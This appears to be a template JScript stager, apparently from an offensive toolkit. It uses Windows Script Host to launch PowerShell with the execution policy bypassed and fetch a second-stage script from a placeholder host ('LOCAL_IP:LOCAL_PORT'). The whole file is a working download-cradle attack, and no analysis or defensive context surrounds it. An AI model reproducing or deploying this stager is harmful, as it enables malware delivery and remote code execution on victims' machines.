var WshShell = new ActiveXObject("Wscript.Shell");
WshShell.run("powershell -nop -exec bypass iwr http://LOCAL_IP:LOCAL_PORT/HTTP_03_powershell.js");